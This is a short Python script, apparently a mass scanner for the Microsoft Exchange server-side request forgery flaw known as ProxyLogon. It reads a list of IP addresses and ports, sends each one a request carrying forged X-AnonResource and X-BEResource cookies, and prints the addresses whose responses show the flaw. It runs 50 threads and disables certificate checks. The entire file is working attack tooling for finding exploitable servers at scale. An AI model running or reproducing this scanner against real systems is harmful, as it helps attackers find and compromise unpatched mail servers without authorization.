import requests, sys, pyfiglet
from multiprocessing.pool import ThreadPool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check(ipport):
  try:
    ipport = ipport.split("	")
    ip = ipport[0]
    port = ipport[1]
    headers = {
      "Cookie":"X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;",
      "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
      }
    r = requests.get(f"https://{ip}:{port}/owa/auth/x.js", headers=headers, timeout=8, verify=False)
    if "NegotiateSecurityContext" in r.text:
      print("VULN IP: " + ip)
  except:
    pass

if len(sys.argv) != 2:
  print(f"Usage: python3 {sys.argv[0]} iplist.txt")
  exit()

ips = [line.rstrip('\n') for line in open(sys.argv[1])]
print(pyfiglet.figlet_format("XCHANGE", font="slant"))
print(f"Found {len(ips)} ips to check! :)\n")
pool = ThreadPool(50)
pool.map(check,ips)